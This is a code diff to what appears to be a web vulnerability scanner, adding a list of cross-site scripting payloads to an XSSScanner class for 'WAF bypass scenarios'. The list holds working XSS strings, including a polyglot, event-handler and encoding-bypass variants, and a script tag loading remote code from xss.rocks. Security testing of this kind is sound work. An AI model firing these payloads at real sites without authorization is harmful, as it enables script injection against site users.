@@ -128,3 +128,35 @@ class XSSScanner(BaseScanner):
             'matched_patterns': matched_patterns,
             'payload_reflected': normalized_payload in response_lower
         }
+    
+    # === Advanced Payload Generation (V17.0) ===
+    
+    ADVANCED_PAYLOADS = [
+        # DOM-based XSS
+        '"><img src=x onerror=alert(document.domain)>',
+        "'-alert(1)-'",
+        '<svg/onload=alert(String.fromCharCode(88,83,83))>',
+        '{{constructor.constructor("return this")().alert(1)}}',
+        # Polyglot payloads
+        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+        # Event handler variants
+        '<details open ontoggle=alert(1)>',
+        '<marquee onstart=alert(1)>',
+        '<video><source onerror=alert(1)>',
+        '<audio src=x onerror=alert(1)>',
+        # Encoding bypass
+        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
+        '%3Cscript%3Ealert(1)%3C/script%3E',
+        # Template injection to XSS
+        '${alert(1)}',
+        '{{7*7}}',
+        # Filter bypass techniques
+        '<scr<script>ipt>alert(1)</scr</script>ipt>',
+        '<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>',
+        '<body/onhashchange=alert(1)>',
+    ]
+    
+    def get_advanced_payloads(self) -> List[str]:
+        """Get advanced XSS payloads for WAF bypass scenarios."""
+        base_payloads = self.generate_payloads()
+        return base_payloads + self.ADVANCED_PAYLOADS
